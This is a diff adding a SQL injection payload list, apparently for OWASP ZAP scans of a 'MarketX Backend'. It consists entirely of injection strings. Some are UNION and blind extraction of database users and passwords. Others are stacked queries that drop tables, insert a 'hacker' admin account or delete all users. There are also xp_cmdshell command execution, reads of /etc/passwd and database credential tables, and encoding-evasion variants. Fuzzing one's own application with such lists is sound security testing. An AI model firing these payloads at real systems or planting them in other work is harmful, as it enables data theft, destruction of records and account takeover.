@@ -1,0 +1,216 @@
+###############################################################################
+# OWASP ZAP SQL Injection Test Payloads - MarketX Backend
+# Heavy Malformed SQL Injection Syntax Payloads
+###############################################################################
+
+# Classic SQL Injection Payloads
+'
+"
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+admin' --
+admin' #
+admin'/*
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1/*
+' OR 'x'='x
+' OR 1=1 LIMIT 1 --
+' OR 1=1 LIMIT 1 #
+' OR 'a'='a
+" OR "1"="1
+" OR "1"="1" --
+" OR "1"="1" #
+" OR 1=1 --
+" OR 1=1 #
+' OR 'abc'='abc
+' OR 1=1 --
+
+# UNION-based SQL Injection
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT NULL, NULL, NULL, NULL --
+' UNION SELECT NULL, NULL, NULL, NULL, NULL --
+' UNION ALL SELECT NULL --
+' UNION ALL SELECT NULL, NULL --
+' UNION ALL SELECT NULL, NULL, NULL --
+' UNION ALL SELECT version() --
+' UNION ALL SELECT user() --
+' UNION ALL SELECT database() --
+' UNION ALL SELECT NULL, version(), NULL --
+' UNION ALL SELECT NULL, NULL, user(), NULL --
+' UNION ALL SELECT NULL, NULL, NULL, database() --
+
+# Heavily Malformed SQL Payloads (Primary Focus)
+';;;DROP TABLE users;;
+' OR 1=1; DROP TABLE users; --
+' UNION SELECT 0x HEXCODE; -- evil
+' AND 1=1)))))))))) --
+' OR 'x'='y' AND 'a'='b
+'/**/OR/**/1=1/**/--
+'/**/UNION/**/SELECT/**/NULL/**/--
+' OR '1'='1' /*!OR*/ 1=1 --
+' OR '1'='1' /**/AND/**/1=1 --
+'; SELECT * FROM users WHERE '1'='1
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND (SELECT COUNT(*) FROM users) = 1 --
+' AND (SELECT MAX(id) FROM users) > 0 --
+' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) --
+' AND UPDATEXML(1, CONCAT(0x7e, user()), 1) --
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x) --
+' AND 1=1)))))))))))))))))))))))))))) --
+' OR 'x'='x'))) ((((((((((((((((((
+' OR 1=1; --)))))))))))))))))))
+' OR 'a'='a' AND 1=1; DROP TABLE sessions --
+' AND SLEEP(5) --
+' AND BENCHMARK(5000000, MD5('test')) --
+' OR 1=1 UNION SELECT CHAR(65), CHAR(66), CHAR(67) --
+' OR 1=1; EXEC xp_cmdshell('dir') --
+' OR 1=1; WAITFOR DELAY '00:00:05' --
+' OR '1'='1'; SELECT password FROM users WHERE username='admin' --
+' OR 1=1; INSERT INTO admin_users (username, password) VALUES ('hacker', 'pwned') --
+' OR 1=1; UPDATE users SET admin='true' WHERE 1=1 --
+' OR 1=1; DELETE FROM users WHERE 1=1 --
+
+# Boolean-based Blind SQL Injection (Malformed)
+' AND 1=1 --
+' AND 1=2 --
+' AND 'x'='x' --
+' AND 'x'='y' --
+' AND (SELECT COUNT(*) FROM users)>0 --
+' AND (SELECT COUNT(*) FROM users)=0 --
+' AND ASCII(SUBSTRING((SELECT user()),1,1))>64 --
+' AND ASCII(SUBSTRING((SELECT user()),1,1))=65 --
+' AND SUBSTRING((SELECT user()),1,1)='a' --
+' AND (SELECT LENGTH(user()) FROM users WHERE id=1)>0 --
+
+# Time-based Blind SQL Injection (Malformed)
+' AND IF(1=1, SLEEP(5), 0) --
+' AND IF(1=2, SLEEP(5), 0) --
+' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END --
+' AND (SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END) --
+' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password)>5) > 0 --
+' AND 1=1; SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN SLEEP(5) ELSE 0 END --
+
+# Stacked Queries with Malformed Syntax
+'; SELECT * FROM users; --
+'; DROP TABLE orders; --
+'; INSERT INTO logs (message) VALUES ('injection') --
+'; UPDATE users SET role='admin' WHERE id=1 --
+'; DELETE FROM cart WHERE 1=1 --
+'; CREATE TABLE pwned (id INT, data TEXT); --
+'; ALTER TABLE users ADD COLUMN backdoor TEXT; --
+'; EXEC sp_executesql @sql; --
+'); DROP TABLE users; --
+'); SELECT * FROM users WHERE id=('1' --
+'); SELECT * FROM users WHERE id=(1 OR 1=1) --
+';--)))))))))))))))))))))))))))))))) --
+
+# Comment-based Injection (Malformed)
+'-- 
+'# 
+'/* 
+'-- comment */ 
+'# comment */ 
+admin'-- 
+admin'# 
+admin'/* 
+' OR 1=1 -- 
+' OR 1=1 # 
+' OR 1=1 /* 
+'/**/OR/**/1=1/**/--
+' OR 'a'='a' -- 
+' OR '1'='1' --
+' OR 1=1 /* */ --
+' OR 1=1; -- //
+' OR 1=1; -- /*
+' OR 'x'='x'; -- //
+
+# Database-specific Malformed Payloads
+# PostgreSQL
+'; SELECT pg_read_file('/etc/passwd'); --
+'; COPY (SELECT * FROM users) TO '/tmp/users.csv'; --
+'; DROP TABLE IF EXISTS users CASCADE; --
+'; SELECT * FROM pg_shadow WHERE usename='postgres'; --
+
+# MySQL/MariaDB
+'; SELECT * FROM mysql.user; --
+'; LOAD_FILE('/etc/passwd'); --
+'; INTO OUTFILE '/tmp/test.txt' --
+'; DROP FUNCTION IF EXISTS exec_code; --
+
+# Error-based SQL Injection (Malformed)
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()))) --
+' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1) --
+' AND (SELECT 2 * (SELECT COUNT(*) FROM information_schema.tables)) --
+' AND 1/0 --
+' AND (SELECT COUNT(*)%2 FROM users)=0 --
+
+# Second-order SQL Injection (Malformed)
+'admin' --
+' OR 'x'='x
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='wrong')=0 --
+' OR 1=1 LIMIT 1 OFFSET 0 --
+' UNION SELECT NULL, NULL, NULL WHERE 1=1 --
+
+# ORM-specific Bypass Attempts
+' OR 1=1 --
+' OR '1'='1
+1' ORDER BY 1 --
+1' ORDER BY 2 --
+1' ORDER BY 3 --
+1' ORDER BY 4 --
+1' ORDER BY 5 --
+1' ORDER BY 6 --
+1' ORDER BY 7 --
+1' ORDER BY 8 --
+1' ORDER BY 9 --
+1' ORDER BY 10 --
+1' GROUP BY username,password HAVING 1=1 --
+1' GROUP BY username,password HAVING 1=2 --
+' AND 1=2 UNION SELECT NULL --
+' AND 1=2 UNION SELECT user() --
+
+# JSON/SOAP Injection
+{"username": "' OR '1'='1"}
+{"username": "admin' --"}
+{"id": "1 OR 1=1"}
+{"id": "1; DROP TABLE users;"}
+[{"name": "' OR '1'='1"}]
+
+# Additional Heavily Malformed Payloads
+'))) OR (((('1'='1
+' AND 1=1 AND 'a'='a
+' OR 'x'='x' AND 'y'='y
+' OR 1=1 AND 1=1
+' OR 1=1 OR 1=1
+' AND (SELECT COUNT(*) FROM users WHERE role='admin')>0 --
+' OR (SELECT COUNT(*) FROM users WHERE verified=1) > 0 --
+' AND 1=1 AND 2=2 AND 3=3
+' OR '1'='1' AND 1=1 --
+' OR 'x'='x' OR 'y'='y
+' AND (SELECT SUBSTR(password,1,1) FROM users WHERE id=1)='a' --
+' AND (SELECT SUBSTR(password,1,1) FROM users WHERE id=1)='b' --
+' AND 1=1; SELECT * FROM information_schema.tables --
+' AND 1=1; SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+' OR 1=1; SELECT GROUP_CONCAT(username, ':', password) FROM users --
+' AND 1=1; DESCRIBE users; --
+' AND 1=1; SHOW TABLES; --
+' AND 1=1; SHOW COLUMNS FROM users; --
+' AND 1=1; SELECT * FROM users WHERE email='test@test.com' --
+' OR '1'='1' AND email LIKE '%@%' --
+' AND (SELECT COUNT(*) FROM pg_catalog.pg_tables)>0 --
+
+# Encoding Evasion Attempts
+' OR '1'%3D'1
+' OR '1'%26%26'1'='1
+' OR 1=1%00--
+' OR 1=1%23--
+' OR '1'='1%00--
+' OR 1=1%0a--
+' OR 1=1%0d--
+' OR 1=1%20--
